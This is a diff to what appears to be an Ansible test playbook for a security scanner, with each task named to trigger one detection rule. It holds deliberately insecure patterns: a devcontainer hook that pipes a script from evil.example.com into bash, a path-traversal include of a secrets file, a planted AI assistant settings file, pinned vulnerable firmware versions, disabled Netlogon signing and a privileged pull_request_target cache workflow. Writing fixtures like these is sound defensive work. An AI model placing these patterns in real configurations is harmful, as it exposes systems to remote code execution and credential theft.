@@ -5495,3 +5495,82 @@
     # --- obfuscation_evasion.yml: inline_env_var_secret_laundering ---
     - name: trigger inline_env_var_secret_laundering
       ansible.builtin.shell: 'API_TOKEN="{{ vault_api_token }}" python3 -c "import os; print(os.environ[''API_TOKEN''])"'
+
+    # --- supply_chain.yml: ci_oidc_token_minted_then_piped_to_signing ---
+    - name: trigger ci_oidc_token_minted_then_piped_to_signing
+      ansible.builtin.shell: |
+        TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sigstore" | jq -r .value)
+        cosign sign --identity-token "$TOKEN" myregistry.example.com/app:1.0.0
+
+    # --- supply_chain.yml: config_file_with_embedded_run_on_event_command ---
+    - name: trigger config_file_with_embedded_run_on_event_command
+      ansible.builtin.copy:
+        dest: /srv/project/.devcontainer/devcontainer.json
+        content: '{ "postCreateCommand": "curl http://evil.example.com/i.sh | bash" }'
+
+    # --- ai_ml_security.yml: ai_assistant_config_or_hook_file_planted ---
+    - name: trigger ai_assistant_config_or_hook_file_planted
+      ansible.builtin.copy:
+        src: files/settings.json
+        dest: /home/dev/project/.claude/settings.json
+
+    # --- ansible_specific.yml: unsafe_content_rerendered_via_hostvars ---
+    - name: trigger unsafe_content_rerendered_via_hostvars
+      ansible.builtin.set_fact:
+        rerendered_value: "{{ hostvars[inventory_hostname]['ansible_local']['x'] }}"
+
+    # --- ansible_specific.yml: git_checkout_jinja_in_branch_or_refspec ---
+    - name: trigger git_checkout_jinja_in_branch_or_refspec
+      ansible.builtin.git:
+        repo: https://git.example.com/app
+        dest: /srv/app
+        version: "{{ event.payload.ref }}"
+
+    # --- ansible_specific.yml: awx_config_yaml_include_path_traversal ---
+    - name: trigger awx_config_yaml_include_path_traversal
+      ansible.builtin.copy:
+        dest: /opt/awx/config.yml
+        content: |
+          creds: !include ../../etc/awx/secrets.yml
+
+    # --- system_compromise.yml: citrix_netscaler_vulnerable_firmware_pinned ---
+    - name: trigger citrix_netscaler_vulnerable_firmware_pinned
+      ansible.builtin.set_fact:
+        netscaler_firmware: "build 14.1-25.56"
+
+    # --- system_compromise.yml: checkpoint_gateway_vulnerable_version_pinned ---
+    - name: trigger checkpoint_gateway_vulnerable_version_pinned
+      ansible.builtin.set_fact:
+        checkpoint_gateway_version: "R81.10"
+
+    # --- system_compromise.yml: fortiweb_vulnerable_version_pinned ---
+    - name: trigger fortiweb_vulnerable_version_pinned
+      ansible.builtin.set_fact:
+        fortiweb_version: "7.6.2"
+
+    # --- system_compromise.yml: windows_netlogon_unpatched_pinned_no_enforcement ---
+    - name: trigger windows_netlogon_unpatched_pinned_no_enforcement
+      ansible.builtin.set_fact:
+        RequireSignOrSeal: 0
+
+    # --- system_compromise.yml: sap_netweaver_vulnerable_version_pinned ---
+    - name: trigger sap_netweaver_vulnerable_version_pinned
+      ansible.builtin.set_fact:
+        sap_netweaver_sp_level: "SP08"
+
+    # --- supply_chain.yml: ci_cache_restored_in_privileged_pull_request_target_job ---
+    - name: trigger ci_cache_restored_in_privileged_pull_request_target_job
+      ansible.builtin.copy:
+        dest: .github/workflows/cache.yml
+        content: |
+          on:
+            pull_request_target:
+              types: [opened, synchronize]
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/cache@v4
+                  with:
+                    path: node_modules
+                    key: deps-${{ hashFiles('package-lock.json') }}
